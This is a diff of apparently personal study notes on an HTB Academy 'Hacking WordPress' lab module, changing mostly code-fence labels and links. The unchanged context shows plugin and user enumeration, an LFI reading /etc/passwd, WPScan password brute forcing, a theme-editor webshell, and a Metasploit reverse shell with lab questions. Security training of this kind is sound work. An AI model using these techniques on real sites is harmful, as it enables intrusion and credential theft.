@@ -1,9 +1,9 @@
 # Hacking Wordpress
 
 Tags: #🧑‍🎓 
-Related to: [[curl]], [[wpscan]] [[msfconsole]], [[html2text]], [[grep]], [[jq]]
+Related to: [[curl]], [[grep]], [[html2text]], [[jq]], [[wpscan]] [[msfconsole]]
 See also: 
-Previous: [[HTB Academy]], [[Information Gathering]]
+Previous: [[HTB Academy]], [[00 KALI/Information Gathering]]
 
 ![[logo_hacking_wordpress.png]]
 
@@ -191,7 +191,7 @@ Below is the directory structure of a default WordPress install, showing the key
 
 	tree -L 1 /var/www/html
 
-```shell-session
+```text
 .
 ├── index.php
 ├── license.txt
@@ -301,7 +301,7 @@ require_once ABSPATH . 'wp-settings.php';
 
 	tree -L 1 /var/www/html/wp-content
 
-```shell-session
+```text
 .
 ├── index.php
 ├── plugins
@@ -314,7 +314,7 @@ require_once ABSPATH . 'wp-settings.php';
 
 	tree -L 1 /var/www/html/wp-includes
 
-```shell-session
+```text
 .
 ├── <SNIP>
 ├── theme.php
@@ -405,7 +405,7 @@ We can also find information about the installed plugins by reviewing the source
 
 	curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
 
-```shell-session
+```text
 http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
 http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
 http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3
@@ -418,7 +418,7 @@ http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/css/mm_frontend.
 
 	curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
 
-```shell-session
+```text
 http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3
 http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3
 http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3
@@ -443,7 +443,7 @@ However, not all installed plugins and themes can be discovered passively. In th
 
 	curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta
 
-```shell-session
+```text
 HTTP/1.1 301 Moved Permanently
 Date: Wed, 13 May 2020 20:08:23 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -456,7 +456,7 @@ If the content does not exist, we will receive a `404 Not Found error`.
 
 	curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin
 
-```shell-session
+```text
 HTTP/1.1 404 Not Found
 Date: Wed, 13 May 2020 20:08:18 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -489,7 +489,7 @@ We can also view the directory listing using cURL and convert the HTML output to
 
 	curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
 
-```shell-session
+```text
 ****** Index of /wp-content/plugins/mail-masta ******
 [[ICO]]       Name                 Last_modified    Size Description
 ===========================================================================
@@ -534,7 +534,7 @@ This can also be done with `cURL` from the command line. The HTTP response in 
 
 	curl -s -I -X GET http://blog.inlanefreight.com/?author=1
 
-```shell-session
+```text
 HTTP/1.1 301 Moved Permanently
 Date: Wed, 13 May 2020 20:47:08 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -550,7 +550,7 @@ The above `cURL` request then redirects us to the user's profile page or the m
 
 	curl -s -I -X GET http://blog.inlanefreight.com/?author=100
 
-```shell-session
+```text
 HTTP/1.1 404 Not Found
 Date: Wed, 13 May 2020 20:47:14 GMT
 Server: Apache/2.4.29 (Ubuntu)
@@ -572,7 +572,7 @@ The second method requires interaction with the `JSON` endpoint, which allows 
 
 	curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq
 
-```shell-session
+```text
 [
   {
     "id": 1,
@@ -775,7 +775,7 @@ Once the installation completes, we can issue a command such as `wpscan --hh` 
 
 	wpscan --hh
 
-```shell-session
+```text
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -830,7 +830,7 @@ The `--enumerate` flag is used to enumerate various components of the WordPres
 
 	wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>
 
-```shell-session
+```text
 [+] URL: http://blog.inlanefreight.com/                                                   
 
 [+] Headers                                                                 
@@ -899,8 +899,6 @@ WPScan uses various passive and active methods to determine versions and vulnera
 #### Questions
 
 >Enumerate the provided WordPress instance for all installed plugins. Perform a scan with WPScan against the target and submit the version of the vulnerable plugin named “photo-gallery”.
->
->
 
 # Exploitation
 
@@ -929,7 +927,7 @@ We can also validate this vulnerability using cURL on the command line.
 
 	curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 
-```shell-session
+```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -956,8 +954,6 @@ We have successfully validated the vulnerability using the data generated in the
 #### Questions
 
 >Use the same LFI vulnerability against your target and read the contents of the "/etc/passwd" file. Locate the only non-root user on the system with a login shell.
->
->
 
 ## Attacking WordPress Users
 
@@ -972,7 +968,7 @@ WPScan can be used to brute force usernames and passwords. The scan report retur
 
 	wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
 
-```shell-session
+```text
 [+] URL: http://blog.inlanefreight.com/                                                  
 [+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                               
 [+] Performing password attack on Xmlrpc against 3 user/s
@@ -987,8 +983,6 @@ Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time
 #### Questions
 
 >Perform a bruteforce attack against the user "roger" on your target with the wordlist "rockyou.txt". Submit the user's password as the answer.
->
->
 
 ## RCE via the Theme Editor
 
@@ -1033,7 +1027,7 @@ We can validate that we have achieved RCE by entering the URL into the web brows
 
 	curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 
-```shell-session
+```text
 uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
 <SNIP>
 ```
@@ -1063,7 +1057,7 @@ To obtain the reverse shell, we can use the `wp_admin_shell_upload` module. We
 
 	search wp_admin
 
-```shell-session
+```text
 Matching Modules
 ================
 
@@ -1078,7 +1072,7 @@ The number `0` in the search results represents the ID for the suggested modul
 
 	use 0
 
-```shell-session
+```text
 msf5 exploit(unix/webapp/wp_admin_shell_upload) >
 ```
 
@@ -1092,7 +1086,7 @@ Each module offers different settings options that we can use to assign precise 
 
 	options
 
-```shell-session
+```text
 Module options (exploit/unix/webapp/wp_admin_shell_upload):
 
 Name       Current Setting  Required  Description
@@ -1129,7 +1123,7 @@ After using the `set` command to make the necessary modifications, we can use 
 	set lhost 10.10.16.8
 	run
 
-```shell-session
+```text
 [*] Started reverse TCP handler on 10.10.16.8z4444
 [*] Authenticating with WordPress using admin:Winter202@...
 [+] Authenticated with WordPress
@@ -1142,7 +1136,7 @@ After using the `set` command to make the necessary modifications, we can use 
 
 	getuid
 
-```shell-session
+```text
 Server username: www—data (33)
 ```
 
@@ -1259,33 +1253,17 @@ Enumerate the target thoroughly using the skills learned in this module to find 
 #### Questions
 
 >Identify the WordPress version number.
->
-> 
 
 >Identify the WordPress theme in use.
->
-> 
 
 >Submit the contents of the flag file in the directory with directory listing enabled.
->
-> 
 
 >Identify the only non-admin WordPress user.
->
-> 
 
 >Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download.
->
-> 
 
 >What is the version number of the plugin vulnerable to an LFI?
->
-> 
 
 >Use the LFI to identify a system user whose name starts with the letter "f".
->
-> 
 
 >Obtain a shell on the system and submit the contents of the flag in the /home/erika directory.
->
-> 
